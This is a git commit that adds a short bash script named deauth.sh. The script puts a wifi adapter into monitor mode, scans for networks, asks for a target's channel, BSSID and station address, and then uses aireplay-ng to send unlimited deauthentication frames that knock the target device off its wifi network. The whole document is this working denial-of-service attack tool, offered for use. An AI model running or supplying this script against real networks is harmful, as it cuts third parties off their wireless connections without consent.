46afa5263543e2b4c312a182387c44ca7274e0c0
Niki20080 <121651059+Niki20080@users.noreply.github.com>
2023-01-08 09:39:28 +0530

    Add files via upload

---
+++ Deauth script/deauth.sh
@@ -0,0 +1,17 @@
+#! /bin/bash
+echo "enter the name of your wifi adapter:"
+read z
+sudo airmon-ng check kill
+sudo airmon-ng check kill
+sudo ip link set $z down
+sudo iw dev wlx984827de9e5f set type monitor
+sudo ip link set $z up
+sudo timeout 60 airodump-ng $z # you can change the time if required
+echo "enter channel number of the target:"
+read a
+sudo iwconfig wlx984827de9e5f channel $a
+echo "enter targets BSSID:"
+read b
+echo "enter targets STATION:"
+read c
+sudo aireplay-ng -0 0 -a $b -c $c $z
